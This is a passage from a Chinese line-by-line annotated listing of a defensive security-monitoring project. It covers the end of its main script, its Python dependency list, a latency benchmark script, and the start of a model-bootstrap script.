| 774 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument(` |
| 775 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--enable-flask",` |
| 776 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dest="enable_flask",` |
| 777 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action="store_true",` |
| 778 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="接入 Phase 7 Flask 工厂，告警实时广播到前端",` |
| 779 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 780 | 返回结果：把处理后的值交回调用方。 | `    return parser.parse_args()` |
| 781 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 782 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 783 | 函数定义：声明 `_enforce_runtime_guards` 的输入、处理逻辑和返回结果。 | `def _enforce_runtime_guards(guardian: SecurityGuardian, loaded: Dict[str, bool]) -> None:` |
| 784 | 文档字符串：说明当前模块、类或函数的职责。 | `    """生产落地保护：关键依赖不满足时 fail-fast 退出。"""` |
| 785 | 条件判断：满足条件时进入对应分支。 | `    if guardian.cfg.require_redis_available and not guardian.redis.is_available:` |
| 786 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 787 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "启动失败：REQUIRE_REDIS_AVAILABLE=true 但 Redis 不可用（当前为内存降级模式）。"` |
| 788 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 789 | 条件判断：满足条件时进入对应分支。 | `    if guardian.cfg.require_models_ready:` |
| 790 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        missing = sorted([name for name, ok in loaded.items() if not ok])` |
| 791 | 条件判断：满足条件时进入对应分支。 | `        if missing:` |
| 792 | 抛出异常：主动报告不可继续的错误。 | `            raise RuntimeError(` |
| 793 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "启动失败：REQUIRE_MODELS_READY=true 且模型未就绪。"` |
| 794 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f" missing={missing}"` |
| 795 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 796 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 797 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 798 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> None:` |
| 799 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _configure_logging()` |
| 800 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 801 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = _parse_args()` |
| 802 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = RuntimeConfig.from_env()` |
| 803 | 注释：解释下面或当前这段代码的设计意图。 | `    # CLI 参数可覆盖环境变量` |
| 804 | 条件判断：满足条件时进入对应分支。 | `    if args.dry_run:` |
| 805 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.dry_run = True` |
| 806 | 条件判断：满足条件时进入对应分支。 | `    if args.no_packet_capture:` |
| 807 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.enable_packet_capture = False` |
| 808 | 条件判断：满足条件时进入对应分支。 | `    if args.no_web_log:` |
| 809 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.enable_web_log = False` |
| 810 | 条件判断：满足条件时进入对应分支。 | `    if args.enable_flask:` |
| 811 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cfg.enable_flask = True` |
| 812 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 813 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info("=" * 60)` |
| 814 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info("AI-Security-Guardian 启动中 (Phase 8)")` |
| 815 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info(` |
| 816 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "配置: dry_run=%s packet=%s web_log=%s flask=%s redis=%s:%s",` |
| 817 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.dry_run,` |
| 818 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.enable_packet_capture,` |
| 819 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.enable_web_log,` |
| 820 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.enable_flask,` |
| 821 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.redis_host,` |
| 822 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.redis_port,` |
| 823 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 824 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info("=" * 60)` |
| 825 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 826 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    guardian = SecurityGuardian(cfg=cfg)` |
| 827 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    loaded = guardian.load_models()` |
| 828 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _enforce_runtime_guards(guardian, loaded)` |
| 829 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 830 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _install_signal_handlers(guardian)` |
| 831 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 832 | 函数调用：执行已有函数/方法完成当前步骤。 | `    guardian.run()` |
| 833 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 834 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 835 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 836 | 函数调用：执行已有函数/方法完成当前步骤。 | `    main()` |

## `requirements.txt`

- 类型：部署与依赖
- 行数：32

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `﻿# 数据处理` |
| 2 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `pandas>=1.5.0` |
| 3 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `numpy>=1.23.0` |
| 4 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `scikit-learn>=1.2.0` |
| 5 | 空行：分隔配置段。 | `&nbsp;` |
| 6 | 配置注释：解释配置项用途。 | `# 深度学习` |
| 7 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `tensorflow>=2.12.0` |
| 8 | 空行：分隔配置段。 | `&nbsp;` |
| 9 | 配置注释：解释配置项用途。 | `# 网络抓包` |
| 10 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `scapy>=2.5.0` |
| 11 | 空行：分隔配置段。 | `&nbsp;` |
| 12 | 配置注释：解释配置项用途。 | `# Web 框架` |
| 13 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask>=2.3.0` |
| 14 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask-sqlalchemy>=3.0.0` |
| 15 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask-socketio>=5.3.0` |
| 16 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask-cors>=4.0.0` |
| 17 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask-jwt-extended>=4.5.0` |
| 18 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `flask-limiter>=3.5.0` |
| 19 | 空行：分隔配置段。 | `&nbsp;` |
| 20 | 配置注释：解释配置项用途。 | `# 数据库` |
| 21 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `sqlalchemy>=2.0.0` |
| 22 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `pymysql>=1.1.0` |
| 23 | 空行：分隔配置段。 | `&nbsp;` |
| 24 | 配置注释：解释配置项用途。 | `# 缓存/队列` |
| 25 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `redis>=4.5.0` |
| 26 | 空行：分隔配置段。 | `&nbsp;` |
| 27 | 配置注释：解释配置项用途。 | `# 工具` |
| 28 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `joblib>=1.3.0` |
| 29 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `python-dateutil>=2.8.0` |
| 30 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `requests>=2.31.0` |
| 31 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `pyyaml>=6.0` |
| 32 | 依赖声明：指定项目运行或测试需要安装的 Python 包。 | `cryptography>=41.0.0` |

## `scripts/benchmark_p95.py`

- 类型：运维/训练脚本
- 行数：140

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：解释下面或当前这段代码的设计意图。 | `#!/usr/bin/env python3` |
| 2 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `基础压测与 P95 采集（与交付文档 §4.2 性能验收对齐）。` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `在项目根目录执行::` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/benchmark_p95.py` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/benchmark_p95.py --api-url http://127.0.0.1:5000 --jwt-token YOUR_TOKEN` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `指标说明` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `--------` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `1. **端到端检测延迟 P95 < 100ms**  ` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `   本脚本对 \`\`WebAttackDetector.detect\`\` 包裹 \`\`perf_counter\`\`，循环 N 次取 P95。  ` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `   反映「特征已构造完成 → 规则/模型推理结束」的进程内耗时。  ` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `   完整链路（抓包 → 聚合 → 特征）需在目标机用 Guardian + 指标 \`\`guardian_detection_latency_ms\`\`（见 \`\`/metrics\`\`）另行观测。` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `2. **Web API P95 < 300ms**  ` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `   对 \`\`GET /api/alerts\`\`（需 JWT）或回退 \`\`GET /healthz\`\` 发起并发 HTTP 请求，打印 P95。  ` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `   默认 \`\`127.0.0.1:5000\`\` 需本地已启动 \`\`python -m web.app\`\`。` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `3. **Redis Stream 无持续堆积**  ` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `   脚本不强制依赖在线 Redis；若提供 \`\`REDIS_URL\`\` 环境变量或本机 \`\`redis-cli\`\`，打印 \`\`XLEN guardian:alerts\`\` 的方法说明。  ` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `   持续堆积应对：连续采样 \`\`XLEN\`\` / \`\`XPENDING\`\`，正常负载下长度应稳定 bounded（\`\`MAXLEN\`\` 软上限）。` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `无法在单机完成的项（无网卡权限、无 Redis、未启动 Web）请在 \`\`docs/deployment.md\`\` 的前置条件中标注，并使用替代验证。` |
| 26 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 27 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 30 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 31 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import statistics` |
| 32 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 33 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 34 | 导入对象：从指定模块引入类、函数或常量。 | `from concurrent.futures import ThreadPoolExecutor, as_completed` |
| 35 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 36 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Optional` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = Path(__file__).resolve().parent.parent` |
| 39 | 条件判断：满足条件时进入对应分支。 | `if str(ROOT) not in sys.path:` |
| 40 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, str(ROOT))` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 函数定义：声明 `_p95` 的输入、处理逻辑和返回结果。 | `def _p95(latencies_ms: List[float]) -> float:` |
| 44 | 条件判断：满足条件时进入对应分支。 | `    if not latencies_ms:` |
| 45 | 返回结果：把处理后的值交回调用方。 | `        return 0.0` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    s = sorted(latencies_ms)` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    idx = max(0, int(round(0.95 * (len(s) - 1))))` |
| 48 | 返回结果：把处理后的值交回调用方。 | `    return s[idx]` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 51 | 函数定义：声明 `bench_detection_latency` 的输入、处理逻辑和返回结果。 | `def bench_detection_latency(iterations: int = 500) -> float:` |
| 52 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.detectors.web_detector import WebAttackDetector  # noqa: PLC0415` |
| 53 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.features.web_features import WebFeatureExtractor  # noqa: PLC0415` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = WebAttackDetector()` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ex = WebFeatureExtractor()` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = {` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "url": "/api/items?id=1",` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "http_method": "GET",` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "status_code": 200,` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "response_size": 100,` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": "198.51.100.1",` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feat = ex.extract(raw)` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    lat: List[float] = []` |
| 66 | 循环：逐个处理集合或迭代器中的元素。 | `    for _ in range(iterations):` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `        det.detect(feat)` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lat.append((time.perf_counter() - t0) * 1000.0)` |
| 70 | 返回结果：把处理后的值交回调用方。 | `    return _p95(lat)` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 函数定义：声明 `bench_http_p95` 的输入、处理逻辑和返回结果。 | `def bench_http_p95(` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    url: str,` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    headers: Optional[dict],` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    workers: int,` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    requests: int,` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> float:` |
| 79 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 80 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import urllib.request` |
| 81 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ImportError:` |
| 82 | 返回结果：把处理后的值交回调用方。 | `        return 0.0` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    latencies: List[float] = []` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 函数定义：声明 `one` 的输入、处理逻辑和返回结果。 | `    def one() -> float:` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 88 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        req = urllib.request.Request(url, headers=headers or {})` |
| 89 | 上下文管理：自动管理资源打开与释放。 | `        with urllib.request.urlopen(req, timeout=30) as resp:` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `            resp.read()` |
| 91 | 返回结果：把处理后的值交回调用方。 | `        return (time.perf_counter() - t0) * 1000.0` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 上下文管理：自动管理资源打开与释放。 | `    with ThreadPoolExecutor(max_workers=workers) as pool:` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        futs = [pool.submit(one) for _ in range(requests)]` |
| 95 | 循环：逐个处理集合或迭代器中的元素。 | `        for f in as_completed(futs):` |
| 96 | 函数调用：执行已有函数/方法完成当前步骤。 | `            latencies.append(f.result())` |
| 97 | 返回结果：把处理后的值交回调用方。 | `    return _p95(latencies)` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ap = argparse.ArgumentParser(description="P95 基准与 Redis 观测说明")` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ap.add_argument(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "--api-url",` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        default=os.environ.get("BENCHMARK_API_URL", "http://127.0.0.1:5000"),` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        help="用于 HTTP 压测的基础 URL",` |
| 106 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ap.add_argument("--jwt-token", default=os.environ.get("BENCHMARK_JWT", ""))` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ap.add_argument("--requests", type=int, default=80)` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ap.add_argument("--workers", type=int, default=8)` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ap.add_argument("--detect-iters", type=int, default=400)` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = ap.parse_args()` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det_p95 = bench_detection_latency(args.detect_iters)` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(f"[检测链路·进程内] WebAttackDetector P95 ≈ {det_p95:.3f} ms (iters={args.detect_iters})")` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    print(f"  目标: P95 < 100 ms（仅规则/推理段；不含采集/网络栈）")` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    hdr = {}` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    path = "/healthz"` |
| 119 | 条件判断：满足条件时进入对应分支。 | `    if args.jwt_token.strip():` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        hdr["Authorization"] = f"Bearer {args.jwt_token.strip()}"` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        path = "/api/alerts"` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    url = args.api_url.rstrip("/") + path` |
| 123 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        http_p95 = bench_http_p95(url, hdr or None, args.workers, args.requests)` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"[HTTP] {path} P95 ≈ {http_p95:.3f} ms (requests={args.requests})")` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print("  目标: P95 < 300 ms（未达标时请检查 DB/Redis/主机负载）")` |
| 127 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[HTTP] 跳过（服务未启动或无权限）: {exc}")` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print("  替代: 启动 Web 后设置 BENCHMARK_JWT 再运行；或仅用 healthz 匿名探测")` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print()` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[Redis Stream 堆积观测]")` |
| 133 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("  redis-cli -a \"$REDIS_PASSWORD\" XLEN guardian:alerts")` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("  redis-cli -a \"$REDIS_PASSWORD\" XPENDING guardian:alerts guardian:web")` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("  正常流量下 XLEN 不应无限增长（流带 MAXLEN 软修剪）；PEL 滞留应被 consumer ack。")` |
| 136 | 返回结果：把处理后的值交回调用方。 | `    return 0` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 140 | 抛出异常：主动报告不可继续的错误。 | `    raise SystemExit(main())` |

## `scripts/bootstrap_models.py`

- 类型：运维/训练脚本
- 行数：116

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `首次部署引导脚本（Phase 8）` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `功能：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 检查 models/saved/ 是否为空` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 若为空，引导用户执行 train_all.py（交互式或 \`--auto\` 直接跑）` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 若已存在部分模型，仅打印清单并退出 0` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `使用：` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/bootstrap_models.py          交互式（默认）` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/bootstrap_models.py --auto   自动训练缺失的模型（CI/CD 友好）` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/bootstrap_models.py --check  仅检查，不训练（适合 Dockerfile 预检）` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `退出码：` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    0 - 模型齐全或已成功训练` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1 - 用户拒绝训练（交互模式）` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2 - 训练失败` |
| 18 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 19 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))` |
| 26 | 条件判断：满足条件时进入对应分支。 | `if ROOT not in sys.path:` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, ROOT)` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `SAVED_DIR = os.path.join(ROOT, "models", "saved")` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 注释：解释下面或当前这段代码的设计意图。 | `# 期望的模型产物（用于完整性判断）` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `EXPECTED_ARTIFACTS = {` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "ddos": ("ddos_rf_v1.pkl", "ddos_rf_v1.model_manifest.json"),` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "intrusion": (` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "intrusion_rf_v1.pkl",` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "intrusion_rf_v1.model_manifest.json",` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "intrusion_scaler_v1.pkl",` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "intrusion_label_encoder_v1.pkl",` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "intrusion_feature_cols_v1.pkl",` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ),` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "web": ("web_attack_nb_v1.pkl", "web_attack_nb_v1.model_manifest.json"),` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "anomaly": ("anomaly_if_v1.pkl", "anomaly_if_v1.model_manifest.json"),` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 函数定义：声明 `_status` 的输入、处理逻辑和返回结果。 | `def _status() -> dict[str, bool]:` |
| 47 | 文档字符串：说明当前模块、类或函数的职责。 | `    """返回每个模型是否"齐全"（所有期望产物都存在且非空）。"""` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: dict[str, bool] = {}` |
| 49 | 循环：逐个处理集合或迭代器中的元素。 | `    for name, files in EXPECTED_ARTIFACTS.items():` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        full_paths = [os.path.join(SAVED_DIR, f) for f in files]` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        out[name] = all(` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.path.exists(p) and os.path.getsize(p) > 0 for p in full_paths` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 54 | 返回结果：把处理后的值交回调用方。 | `    return out` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 函数定义：声明 `_print_status` 的输入、处理逻辑和返回结果。 | `def _print_status(status: dict[str, bool]) -> None:` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n模型状态：")` |
